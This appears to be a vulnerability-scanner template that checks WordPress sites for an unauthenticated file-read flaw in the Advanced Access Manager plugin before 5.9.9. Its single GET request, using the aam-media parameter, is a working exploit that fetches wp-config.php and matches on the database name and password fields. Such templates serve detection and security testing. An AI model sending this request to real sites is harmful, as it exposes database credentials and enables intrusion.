id: advanced-access-manager-lfi
info:
  author: 0x_Akoko
  description: The Advanced Access Manager WordPress plugin, versions before 5.9.9,
    allowed reading arbitrary files. This way one can download the wp-config.php file
    and get access to the database, which is publicly reachable on many servers.
  name: Advanced Access Manager < 5.9.9 - Unauthenticated Local File Inclusion
  reference:
  - https://wpscan.com/vulnerability/9873
  - https://id.wordpress.org/plugins/advanced-access-manager/
  severity: high
  tags: wordpress,wp-plugin,lfi
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?aam-media=wp-config.php'
